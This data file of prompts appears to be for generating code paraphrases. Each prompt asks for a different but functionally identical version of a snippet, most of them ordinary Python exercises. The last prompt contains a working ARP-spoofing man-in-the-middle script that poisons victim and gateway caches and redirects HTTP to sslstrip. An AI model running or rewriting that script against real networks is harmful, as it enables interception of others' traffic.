{"prompt": "make some code that functions the same as the following code: import numpy as np\nimport matplotlib.pyplot as plt\nimport pandas as pd\n\n# Importing the dataset\ndataset = pd.read_csv('data.csv')\nX = dataset.iloc[:, :-1].values\ny = dataset.iloc[:, 784].values\n\n# Encoding categorical data\nfrom sklearn.preprocessing import LabelEncoder\nlabelencoder_y = LabelEncoder()\ny = labelencoder_y.fit_transform(y)\n\n# Feature Scaling\nfrom sklearn.preprocessing import StandardScaler\nsc = StandardScaler()\nX = sc.fit_transform(X)\n\n# Splitting the dataset\nfrom sklearn.model_selection import train_test_split\nX_train, X_test, y_train, y_test = train_test_split(X, y, test_size = 0.2, random_state = 0)\n\n# Importing the Keras libraries and packages\nimport keras\nfrom keras.models import Sequential\nfrom keras.layers import Dense\n\n# Initialising the ANN\nclassifier = Sequential()\n\n# Adding the input layer and the first hidden layer\nclassifier.add(Dense(output_dim = 400, init = 'uniform', activation = 'relu', input_dim = 784))\n\n# Adding the second hidden layer\nclassifier.add(Dense(output_dim = 400, init = 'uniform', activation = 'relu'))\n\n# Adding the output layer\nclassifier.add(Dense(output_dim = 10, init = 'uniform', activation = 'softmax'))\n\n# Compiling the ANN\nclassifier.compile(optimizer = 'adam', loss = 'categorical_crossentropy', metrics = ['accuracy'])\n\n# Fitting the ANN to the Training set\nclassifier.fit(X_train, y_train, batch_size = 128, nb_epoch = 10)\n \n# Predicting the Test set results\ny_pred = classifier.predict(X_test)\n\n# Making the Confusion Matrix\nfrom sklearn.metrics import confusion_matrix\ncm = confusion_matrix(y_test, y_pred)\n\n# Calculating the accuracy\nfrom sklearn.metrics import accuracy_score\naccuracy = accuracy_score(y_test, y_pred) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: mylist = [3, 5, 7, 9]\ntotal = 0\n\nfor item in mylist:\n   total = total + item\n\nprint(\"The sum of list items is:\", total) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def quick_sort(arr): \n  if len(arr) <= 1:\n  return arr\n  \n  pivot = arr[len(arr) // 2]\n  lesser_arr, equal_arr, greater_arr = [], [], []\n  for num in arr:\n  if num < pivot:\n  lesser_arr.append(num)\n  elif num == pivot:\n  equal_arr.append(num)\n  else:\n  greater_arr.append(num)\n    \n  return quick_sort(lesser_arr) + equal_arr + quick_sort(greater_arr) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: results = [-1, 4, -6]\n \n# loop through the list\nfor i in range(len(results)):\n    # if the element is positive add one\n    if results[i] > 0:\n        results[i] = results[i] + 1\n    # if the element is negative subtract one\n    elif results[i] < 0:\n        results[i] = results[i] - 1\n    # multiply by 2\n    results[i] = results[i] * 2\n    # divide by 4\n    results[i] = results[i] / 4\n \nprint(results) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: import smtplib\n\nsender = 'test@example.com'\nreceiver = 'test@example.com'\nsubject = 'test'\nmessage = 'Hello World'\n\ntry:\n smtpObj = smtplib.SMTP('localhost')\n smtpObj.sendmail(sender, receiver,\n  \"Subject: \" + subject + \"\\n\" + message)\n print(\"Successfully sent email\")\nexcept Exception as e:\n print(\"Error: unable to send email\") but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def linear_search(numbers, key):\n    for index, element in enumerate(numbers):\n        if element == key:\n            return index\n    return -1 but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: string = \"abcabc\"\n\n# To store unique substring\nlist_unique_substrings = []\n# Iterating through the length of string\nfor index_i in range(len(string)):\n    # Iterating through the range of index_i and string length\n    for index_j in range(index_i, len(string)):\n        # Slice the substring from index_i to index_j\n        substr = string[index_i: index_j + 1]\n        # check if substring is already in list\n        if substr not in list_unique_substrings:\n            list_unique_substrings.append(substr)\n\n# Print the list of unique substrings\nprint(list_unique_substrings) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def Fibonacci(n): \n    if n==0: \n        return 0\n    elif n==1: \n        return 1\n    else: \n        return Fibonacci(n-1)+Fibonacci(n-2)  \n\n# Driver Code\nprint(\"Fibonacci series:\") \nfor i in range(10): \n    print(Fibonacci(i), end=\" \") but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def filter_negative(data):\n    \"\"\"Filters out all negative numbers from a list\"\"\"\n    return [x for x in data if x >= 0] but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def is_prime(num):\n    # 1 is not a prime number \n    if num == 1:\n        return False\n  \n    for i in range(2, num):\n        if num % i == 0:\n            return False\n    return True but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: class MaxHeap:\n    def __init__(self, array):\n        self.heap = self.build_heap(array)\n\n    def build_heap(self, array):\n        n = len(array)\n        for i in reversed(range(n // 2)):\n            self.heapify(i, array, n)\n        return array\n\n    def heapsort(self, array):\n        n = len(array)\n        for i in reversed(range(n)):\n            array[i], array[0] = array[0], array[i]\n            self.heapify(0, array, i)\n        return array\n\n    def heapify(self, current_index, array, heap_size):\n        largest = current_index\n        left_child = 2 * current_index + 1\n        right_child = 2 * current_index + 2\n        if (left_child < heap_size and\n           array[left_child] > array[largest]):\n            largest = left_child\n        if (right_child < heap_size and\n                array[right_child] > array[largest]):\n            largest = right_child\n        if largest != current_index:\n            array[largest], array[current_index] = (\n                array[current_index], array[largest]\n            )\n            self.heapify(largest, array, heap_size) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: The most common way of generating summaries from long articles using Python is to use Natural Language Processing (NLP) to identify the most important sentences in the text. We can use existing libraries such as summa and NLTK to identify the most important sentences in the text. The main steps involved in generating summaries are: \n\n1. Preprocessing the raw text by removing punctuation marks, HTML tags, special characters and stop words and tokenizing the text into sentences.\n\n2. Using TextRank Algorithm to determine the most important sentences in the text.\n\n3. Generating the summary by selecting the most important sentences and combining them into a cohesive statement or narrative. but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def word_lengths(words):\n    lengths = {}\n    for word in words:\n        lengths[word] = len(word)\n    return lengths\n\nresult = word_lengths(['cat', 'dog', 'kangaroo', 'tiger'])\nprint(result) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: import matplotlib.pyplot as plt \n\n# Create data\nlabels = ['Boys', 'Girls']  \nvalues =[50, 80, 100, 90, 60, 70, 90, 95]\n  \n# naming the x-axis \nplt.xlabel('Category') \n# naming the y-axis \nplt.ylabel('Score') \n# plot title \nplt.title('Bar Plot') \n  \n# plot the generated values  \nplt.bar(labels, values) \n# function to show the plot \nplt.show() but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def get_fibonacci_series(n):\n\t# Initialize empty list for Fibonacci series \n\tseries = []\n\ta = 0\n\tb = 1\n\t# Iterate till number of terms required \n\tfor i in range(n):\n\t\tseries.append(a)\n\t\tc = a + b \n\t\ta = b \n\t\tb = c \n\treturn series but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: for outer in arr:\n   for inner in outer:\n       print(inner) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: import pandas as pd\nfrom sklearn.ensemble import RandomForestClassifier\n\n# Load the dataset\ndataframe = pd.read_csv(<path_to_csv>)\nX = dataframe.iloc[:, 0:4].values\ny = dataframe.iloc[:, 4].values\n\n# Train the classifier\nclassifier = RandomForestClassifier(n_estimators=100, random_state=0)\nclassifier.fit(X, y)\n\n# Make predictions\ny_pred = classifier.predict(X) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def factorial(n):\n    if n == 0:\n        return 1\n    else:\n        return n*factorial(n-1)\n      \nresult = factorial(5)\nprint(result) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: for i in range(1, 101):\n if i % 3 == 0 and i % 5 == 0:\n print(\"FizzBuzz\")\n elif i % 3 == 0:\n print(\"Fizz\")\n elif i % 5 == 0:\n print(\"Buzz\")\n else:\n print(i) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: x = 0\nfor i in range(100):\n    x += i * 100\n    for j in range(100):\n        x += j but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: class Student:\n \n    def __init__(self, name, age, gender):\n        self.name = name\n        self.age = age\n        self.gender = gender\n \n    def get_name(self):\n        return self.name\n \n    def get_age(self):\n        return self.age\n \n    def get_gender(self):\n        return self.gender but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: import nltk\nnltk.download('punkt')\nfrom nltk.stem.lancaster import LancasterStemmer\nstemmer = LancasterStemmer()\n\nimport numpy\nimport tflearn\nimport tensorflow\nimport random\nimport json\n\nwith open(\"intents.json\") as file:\n data = json.load(file)\n\nwords = []\nlabels = []\ndocs_x = []\ndocs_y = []\n\nfor intent in data[\"intents\"]:\n for pattern in intent[\"patterns\"]:\n  wrds = nltk.word_tokenize(pattern)\n  words.extend(wrds)\n  docs_x.append(wrds)\n  docs_y.append(intent[\"tag\"])  \n\n# Stem and lowercase the words\nwords = [stemmer.stem(w.lower()) for w in words if w != \"?\"]\nwords = sorted(list(set(words)))\n\nlabels = sorted(labels)\n\ntraining = []\noutput = []\n\n# Create training data\nout_empty = [0 for _ in range(len(labels))]\n\nfor x, doc in enumerate(docs_x): \n bag = []\n\n w = [stemmer.stem(w.lower()) for w in doc] \n\n for w in words:\n    if w in w:\n        bag.append(1)\n    else:\n        bag.append(0)\n\n output_row = out_empty[:]\n output_row[labels.index(docs_y[x])] = 1\n\n training.append(bag)\n output.append(output_row)\n\ntraining = numpy.array(training)\noutput = numpy.array(output)\n\n# Build the model\ntensorflow.reset_default_graph()\nnet = tflearn.input_data(shape=[None, len(training[0])])\nnet = tflearn.fully_connected(net, 8)\nnet = tflearn.fully_connected(net, 8)\nnet = tflearn.fully_connected(net, len(output[0]), activation=\"softmax\")\nnet = tflearn.regression(net)\n\nmodel = tflearn.DNN(net)\n\n# Train the model\nmodel.fit(training, output, n_epoch=1000, batch_size=8, show_metric=True)\nmodel.save(\"model.tflearn\")\n\n# Chatbot function\ndef chatbot_response(sentence):\n sentence = sentence.lower()\n\n results = model.predict([bag_of_words(sentence, words)])\n results_index = numpy.argmax(results)\n tag = labels[results_index]\n\n for tg in data[\"intents\"]:\n  if tg['tag'] == tag:\n   responses = tg['responses']\n \n return random.choice(responses) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: from flask import Flask, jsonify, request\nfrom flask_sqlalchemy import SQLAlchemy\n\napp = Flask(__name__)\napp.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:////tmp/test.db'\ndb = SQLAlchemy(app)\n\nclass Item(db.Model):\n id = db.Column(db.Integer, primary_key=True)\n name = db.Column(db.String(50))\n description = db.Column(db.String(200))\n \n@app.route('/items', methods=['GET'])\ndef get_items():\n items = Item.query.all()\n return jsonify([item.__dict__() for item in items])\n\n@app.route('/items/<int:id>', methods=['GET'])\ndef get_item(id):\n item = Item.query.get(id).__dict__()\n return jsonify(item)\n\n@app.route('/items', methods=['POST'])\ndef add_item():\n item = Item(name=request.json['name'], description=request.json['description'])\n db.session.add(item)\n db.session.commit()\n return jsonify(item.__dict__())\n\n@app.route('/items/<int:id>', methods=['PUT'])\ndef update_item(id):\n item = Item.query.get(id)\n item.name = request.json['name']\n item.description = request.json['description']\n db.session.commit()\n return jsonify(item.__dict__())\n\n@app.route('/items/<int:id>', methods=['DELETE'])\ndef delete_item(id):\n Item.query.filter_by(id=id).delete()\n db.session.commit()\n return {'message': 'Item deleted'}\n\nif __name__ == '__main__':\n app.run(debug=True) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def find_longest_increasing_subsequences(arr): \n    # Array to store ending \n    # index of longest increasing subsequences \n    seq_lengths = [1 for i in range(len(arr))] \n  \n    # For every element store its index as a starting index \n    # of increasing subsequences \n    starting_seq_idx = [-1 for i in range(len(arr))] \n  \n    max_length = 1\n    for i in range(1, len(arr)): \n        for j in range(i):  \n            if arr[i] > arr[j] and seq_lengths[i] < seq_lengths[j] + 1: \n                seq_lengths[i] = seq_lengths[j] + 1\n                starting_seq_idx[i] = j \n  \n                if max_length < seq_lengths[i]: \n                    max_length = seq_lengths[i] \n  \n    longest_incr_seqs = [] \n    # Backtrack starting index to get actual sequence \n    # and add to result \n    while max_length > 0: \n  \n        # An empty result list to store \n        # longest decreasing subsequences \n        max_seq = [] \n  \n        for i in range(len(arr)): \n            if seq_lengths[i] == max_length: \n                # Follow the values from back to front \n                temp = i \n                while temp >= 0: \n                    max_seq.append(arr[temp]) \n                    temp = starting_seq_idx[temp] \n  \n                longest_incr_seqs.append(max_seq[::-1]) \n                max_length -= 1\n    return longest_incr_seqs\n  \narr = [2, 4, 3, 5, 1, 7, 6] \n\nresult = find_longest_increasing_subsequences(arr)\nprint(result) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: class ObjectAbstract:\n    def __init__(self):\n        self.data = None\n\n    def get_data(self):\n        return self.data\n\n    def set_data(self, data):\n        self.data = data\n\n    def print_data(self):\n        print(self.data) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def isAnagram(sentence, anagram):  \n    sentence = ''.join(sentence.split())\n    anagram = ''.join(anagram.split())\n\n    if(sorted(sentence) == sorted(anagram)): \n        return True  \n    else: \n        return False\n\nif isAnagram(sentence, anagram): \n    print(\"The given strings are anagrams!\")\nelse: \n    print(\"The given strings are not anagrams.\") but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: import nfc\n\ndef on_connect(tag):\n print('Tag connected')\n # Read data\n data = tag.read()\n print(data)\n # Write data\n tag.write('Hello World!')\n\nwith nfc.ContactlessFrontend('usb') as clf:\n clf.connect(rdwr={'on-connect': on_connect}) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: import re\n\ndef is_valid_email(email):\n email_regex = re.compile(r'^[\\w.+-]+@[\\w.-]+\\.[a-zA-Z]{2,4}$')\n return True if email_regex.match(email) else False\n\naddress = input(\"Please enter an email address: \")\n\nif is_valid_email(address):\n print('Valid')\nelse:\n print('Invalid') but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def sort_list(input_list): \n   \n    # Set the boolean flag to True\n    flag = True\n  \n    # Loop until flag becomes False\n    while flag: \n      \n        # Set the flag to False\n        flag = False\n      \n        # Go through each item of the list\n        for i in range(0, len(input_list)-1): \n          \n            # Compare the current item with the item next to it\n            if input_list[i] < input_list[i+1]: \n              \n                # Swapping the elements \n                temp = input_list[i] \n                input_list[i] = input_list[i+1] \n                input_list[i+1] =temp \n                flag = True\n  \n    # Return the new sorted list\n    return input_list\n\n# Call the function\ninput_list = [5, 6, 11, 15, 20, 1, 8]\nprint(sort_list(input_list))\n\n# Output: [20, 15, 11, 8, 6, 5, 1] but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def loop_through_list(items):\n    \"\"\"Iterates through a list of items and prints each one\"\"\"\n    for item in items:\n        print(item) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def max_sum_sublist(list_a):\n start = 0\n end = 0\n max_sum = 0\n \n current_sum = 0\n for i in range(len(list_a)):\n  current_sum += list_a[i]\n  if current_sum < 0:\n   current_sum = 0\n   start = i + 1\n  if current_sum > max_sum:\n   max_sum = current_sum\n   end = i\n \n return list_a[start:end+1]\n \nmax_sum_sublist(list_a) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: import numpy as np\n\n# Set the threshold value to determine what is an outlier\nthreshold = 3\n\ndef detectOutliers(data):\n    # calculate the median\n    median = np.median(data)\n    # calculate the absolute deviations from the median\n    abs_devs = [abs(val - median) for val in data]\n    # calculate the median of the absolute deviations\n    med_abs_dev = np.median(abs_devs)\n    # calculate the scaled absolute deviations\n    scaled_abs_dev = [abs_dev/med_abs_dev for abs_dev in abs_devs]\n    outliers = [val for val in scaled_abs_dev if val > threshold]\n    return outliers\n\ndata = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]\noutliers = detectOutliers(data)\nprint(\"Outliers: \", outliers) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def alphabetize_list(arr):\n  arr.sort()\n  return ' '.join(arr)\n\ndata = ['apple', 'banana', 'orange']\nresult = alphabetize_list(data)\nprint(result) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: import cv2\nimport numpy as np\n\n# Setup Video Capture\ncap = cv2.VideoCapture(0) # 0 is the default webcam\n\n# Object Classifier\nobject_classifier = cv2.CascadeClassifier('object.xml')\n\n# Tracking\nwhile True: \n ret, frame = cap.read()\n gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)\n\n # Detect Objects\n objects = object_classifier.detectMultiScale(gray, 1.3, 5)\n\n for (x,y,w,h) in objects:\n cv2.rectangle(frame, (x,y), (x+w, y+h), (255,0,0), 2)\n cv2.putText(frame, 'Objects', (x,y), cv2.FONT_HERSHEY_COMPLEX, 1, (0,255,0), 2)\n\n # Track the objects\n cv2.imshow('Object Tracking', frame)\n if cv2.waitKey(1) == 27: # Press Escape to exit\n break\n\ncap.release()\ncv2.destroyAllWindows() but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: \"\"\"Read a CSV file and print the sum of each column.\"\"\"\n\nimport csv\n\ndef print_col_sums(filename):\n    # open the file and read into a list of lines\n    with open(filename, 'r') as csv_file:\n        csv_reader = csv.reader(csv_file)\n        data = list(csv_reader)\n\n    # initialize list to store column sums\n    col_sums = [0] * len(data[0])\n\n    # loop through data and compute sums\n    for line in data:\n        for i in range(len(line)):\n            col_sums[i] += int(line[i])\n\n    # print the column sums\n    print('Column sums:', col_sums)\n\nif __name__ == '__main__':\n    print_col_sums('sample.csv') but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def max_of_two(x, y): \n    if x > y: \n        return x \n    else: \n        return y \n  \nprint(max_of_two(3,6)) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: \"\"\"\nProgram to classify a sentence into positive or negative\n\"\"\"\n\ndef classify_sentence(sentence):\n    \"\"\"Classifies a given sentence into positive or negative\n\n    Args:\n        sentence (str): The sentence to be classified\n\n    Returns:\n        str: 'positive' or 'negative'\n    \"\"\"\n    tokenized_sentence = sentence.split()\n    num_positive = 0\n    num_negative = 0\n    for word in tokenized_sentence:\n        if word in positive_words:\n            num_positive += 1\n        elif word in negative_words:\n            num_negative += 1\n    if num_positive > num_negative:\n        return \"positive\"\n    elif num_negative > num_positive:\n        return \"negative\"\n    else:\n        return \"neutral\"\n\nif __name__ == '__main__':\n    sentence = input()\n    print(classify_sentence(sentence)) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: import spacy\nimport nltk\n\n# load the model\nnlp = spacy.load('en_core_web_sm')\n\n# define the input article\ntext = \"The world is in a state of crisis. Social media and technology have taken over our lives, and it has caused serious harm to our mental health and wellbeing. We have become isolated and more disconnected from other people and nature. It\u2019s time to take a break and reconnect with the real world.\"\n\n# tokenize the article\ndoc = nlp(text)\nsentences = [sent.string.strip() for sent in doc.sents]\n\n# generate the summary\ndef generate_summary(sentences):\n  # create a list for tokenized sentences\n  tokenized_sentences = [nltk.word_tokenize(sentence) for sentence in sentences]\n\n  # create the frequency table\n  frequency_table = dict()\n  for sentence in tokenized_sentences:\n    for word in sentence:\n      if word in frequency_table:\n        frequency_table[word] += 1\n      else:\n        frequency_table[word] = 1\n\n  # calculate the weighted frequency\n  max_frequency = max(frequency_table.values())\n  for word in frequency_table.keys():\n    frequency_table[word] = frequency_table[word]/max_frequency\n\n  # calculate the score for each sentence\n  sentence_scores = dict()\n  for sent in tokenized_sentences:\n    for word in sent:\n      if word in frequency_table.keys():\n        if sent not in sentence_scores.keys():\n          sentence_scores[sent] = frequency_table[word]\n        else:\n          sentence_scores[sent] += frequency_table[word]\n\n  # return the summary\n  summary_sentences = heapq.nlargest(3, sentence_scores, key=sentence_scores.get)\n  summary = ' '.join(summary_sentences)\n  return summary\n\n# print the summary\nprint(generate_summary(sentences))\n\n# Output:\nIt's time to take a break and reconnect with the real world. Social media and technology have taken over our lives, causing serious harm to our mental health and wellbeing. We have become isolated and more disconnected from other people and nature. but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: import string \n\ndef encode_base_62(n): \n    base62 = string.digits + string.ascii_uppercase + string.ascii_lowercase\n    output = \"\" \n    while n > 0:\n        output = base62[n%62] + output\n        n //= 62\n    return output but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: import requests\nfrom bs4 import BeautifulSoup\n\n\ndef scrape_wiki(url):\n    response = requests.get(url)\n    soup = BeautifulSoup(response.text, 'html.parser')\n\n    # find all headlines\n    headers = soup.find_all('h1', {'id': 'firstHeading'})\n    for header in headers:\n        print(header.get_text())\n\n    # find all links\n    links = soup.find_all('a')\n    for link in links:\n        print(link.get('href'))\n\n\nif __name__ == '__main__':\n    url = 'https://en.wikipedia.org/wiki/Python_(programming_language)'\n    scrape_wiki(url) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: import numpy as np\nimport matplotlib.pyplot as plt\n\nfrom keras.models import Sequential\nfrom keras.layers import Dense\n\n# create model\nmodel = Sequential()\nmodel.add(Dense(units=200, input_dim=2, activation='relu'))\nmodel.add(Dense(units=200, activation='relu'))\nmodel.add(Dense(units=1, activation='sigmoid'))\n\n# Compile model\nmodel.compile(loss='binary_crossentropy', optimizer='adam', metrics=['accuracy'])\n\n# Fit the model\nmodel.fit(X, y, epochs=1500, batch_size=128)\n\n# evaluate the model\nscores = model.evaluate(X, y)\nprint(\"\\n%s: %.2f%%\" % (model.metrics_names[1], scores[1]*100)) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: import numpy as np\nimport pandas as pd\nimport matplotlib.pyplot as plt\n\n# Load the data set\ndata = pd.read_csv('./data.csv')\n\n# Get the variables to analyze\nX = data['variable1']\nY = data['variable2']\n\n# Calculate the correlation\ncorrelation = np.corrcoef(X, Y)\n\n# Print out the result\nprint('The correlation between Variable1 and Variable2 is: ' + str(correlation[0][1]))\n\n# Plot a scatter plot for the data\nplt.scatter(X, Y)\nplt.xlabel('Variable1')\nplt.ylabel('Variable2')\nplt.title('Scatter Plot')\nplt.show() but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: A list is being used in this code snippet. Advantages of using a list are that it is mutable, can store duplicate data, and allows for indexing. Disadvantages of using a list are that it can be slow if the list is very long and operations take a long time. but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def get_year(date):\n    return date.split('/')[2]\n\nyear = get_year('02/03/2019')\nprint(year) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: def binary_search(arr, target):\n    low = 0\n    high = len(arr) - 1\n    while low <= high:\n        mid = (low + high) // 2\n        if arr[mid] == target:\n            if mid == 0 or arr[mid-1] < target:\n                return mid\n            else:\n                high = mid - 1\n\n        elif arr[mid] < target:\n            low = mid + 1\n        else:\n            high = mid - 1\n    return -1\n\n# example\narr = [1, 3, 3, 4, 5, 6, 8]\ntarget = 3\nprint(binary_search(arr, target)) # 1 but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: class Vector3D:\n    def __init__(self, x, y, z):\n        self.x = x\n        self.y = y\n        self.z = z\n    \n    def magnitude(self):\n        return (self.x**2 + self.y**2 + self.z**2)**0.5\n    \n    def normalize(self):\n        magnitude = self.magnitude()\n        return Vector3D(self.x/magnitude, self.y/magnitude, self.z/magnitude)\n    \n    def __add__(self, other):\n        return Vector3D(self.x + other.x, self.y + other.y, self.z + other.z) but is not the same. just give one example and only return the code."}
{"prompt": "make some code that functions the same as the following code: #!/usr/bin/python\n\n# src from https://github.com/rusec/scapy-arpspoof-demo\n\nfrom scapy.all import *\nfrom argparse import ArgumentParser\n\nimport os\n\nIP_FORWARD = '/proc/sys/net/ipv4/ip_forward'\nTIMEOUT = 2\nRETRY = 10\n\n# This function uses argparse to parse command line\n# arguments passed to the script.\ndef set_configs():\n\n    # create a new ArgumentParser\n    parser = ArgumentParser()\n\n    # add definitions for command line arguments\n    parser.add_argument('-t',\n                    dest='victim',\n                    required=True,\n                    type=str,\n                    help='The victim\\'s IP address')\n\n    parser.add_argument('-g',\n                    dest='gateway',\n                    required=True,\n                    type=str,\n                    help='The gateway\\'s IP address')\n\n    parser.add_argument('-i',\n                    dest='interface',\n                    required=True,\n                    type=str,\n                    help='Use this network interface')\n\n    # parse command line arguments according to those definitions\n    args = parser.parse_args()\n\n    # use arguments to construct config dictionary\n    return {\n\n        'victim' :  {\n\n            'ip' : args.victim,\n            'mac' : ip_to_mac(args.victim),\n        },\n\n        'gateway' :  {\n            'ip' : args.gateway,\n            'mac' : ip_to_mac(args.gateway),\n        },\n\n        'iface' : args.interface,\n    }\n\n# enables packet forwarding by interacting with the proc filesystem\ndef enable_packet_forwarding():\n\n    with open(IP_FORWARD, 'w') as fd:\n        fd.write('1')\n\n# disables packet forwarding by interacting with the proc filesystem\ndef disable_packet_forwarding():\n\n    with open(IP_FORWARD, 'w') as fd:\n        fd.write('0')\n\n# use iptables to redirect http traffic to port 10000 where it can\n# be parsed using sslstrip\ndef enable_http_redirection():\n\n    print '[*] Redirecting all http traffic to port 10000'\n\n    os.system('iptables -v -t nat  -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')\n\n# restore iptables to default state\ndef disable_http_redirection():\n\n    print '[*] Disabling http redirection'\n\n    os.system('iptables -v --flush')\n    os.system('iptables -v --table nat --flush')\n    os.system('iptables -v --delete-chain')\n    os.system('iptables -v --table nat --delete-chain')\n\n\n# uses scapy to arp poison victim\ndef poison_victim(configs):\n\n    # get victim and gateway ip and hardware addresses from\n    # configs\n    victim_mac = configs['victim_mac']\n    gateway_mac = configs['gateway_mac']\n\n    victim_ip = configs['victim_ip']\n    gateway_ip = configs['gateway_ip']\n\n    # create layer 3 Arp() packets\n    victim_arp = ARP()\n    gateway_arp = ARP()\n\n    # set Operation to 'is-at'\n    victim_arp.op = 2\n    gateway_arp.op = 2\n\n    # set hwdst\n    victim_arp.hwdst = victim_mac\n    gateway_arp.hwdst = gateway_mac\n\n    # set pdst\n    victim_arp.pdst = victim_ip\n    gateway_arp.pdst = gateway_ip\n\n    # set psrc\n    victim_arp.psrc = gateway_ip\n    gateway_arp.psrc = victim_ip\n\n    # continue attack indefinitely\n    while True:\n\n        try:\n\n            print '[*] Poisoning victim'\n\n            # send spoofed arp replies\n            send(victim_arp)\n            send(gateway_arp)\n\n            # wait for ARP replies from default GW or victim\n            sniff(filter='arp and host %s or %s' %\\\n                        (gateway_ip, victim_ip), count=1)\n\n\n        # break out of loop if user hits ctrl+c\n        except KeyboardInterrupt:\n            break\n\n    print '[*] All done!'\n\n# restores the victim and gateway's arp cache to its correct\n# state\ndef restore_victim(configs):\n\n    victim_mac = configs['victim_mac']\n    gateway_mac = configs['gateway_mac']\n\n    victim_ip = configs['victim_ip']\n    gateway_ip = configs['gateway_ip']\n\n    # create a Layer 3 ARP() packet\n    victim_arp = ARP()\n\n    # set correct source ip and mac\n    victim_arp.hwsrc = gateway_mac\n    victim_arp.psrc = gateway_ip\n\n    # broadcast 'is-at' packet\n    gateway_arp.op = 2\n    gateway_arp.hwdst = 'ff:ff:ff:ff:ff:ff'\n    send(gateway_arp)\n\n    # create a Layer 3 ARP() packet\n    gateway_arp = ARP()\n\n    # set correct source ip and mac\n    gateway_arp.hwsrc = victim_mac\n    gateway_arp.psrc = victim_ip\n\n    # broadcast 'is-at' packet\n    gateway_arp.op = 2\n    gateway_arp.hwdst = 'ff:ff:ff:ff:ff:ff'\n    send(gateway_arp)\n\n# sends a legitimate arp request to resolve an IP to a\n# mac address\ndef ip_to_mac(ip, retry=RETRY, timeout=TIMEOUT):\n\n    arp = ARP()\n\n    # set operation to 'who-has' (arp request)\n    arp.op = 1\n\n    arp.hwdst = 'ff:ff:ff:ff:ff:ff'\n    arp.pdst = ip\n\n    response, unanswered = sr(arp, retry=retry, timeout=timeout)\n\n    # get the response from the first packet received by accessing\n    # layer 2 header\n    for s,r in response:\n        return r[ARP].underlayer.src\n\n    # return failure\n    return None\n\n# driver function for arp cache poisoning attack\ndef poison(configs):\n\n    enable_packet_forwarding()\n    enable_http_redirection()\n    #poison_victim(configs)\n\n# driver function for restoring victim and gateway after\n# arp cache poisoning attack\ndef antidote(configs):\n\n    #restore_victim(configs)\n    disable_http_redirection()\n    disable_packet_forwarding()\n\ndef main():\n\n    configs = set_configs()\n\n    print '[*] Using interface', configs['iface']\n    conf.iface = configs['iface']\n\n    try:\n        poison(configs)\n    except KeyboardInterrupt:\n        pass\n\n    antidote(configs)\n\nif __name__ == '__main__':\n    main()\n but is not the same. just give one example and only return the code."}
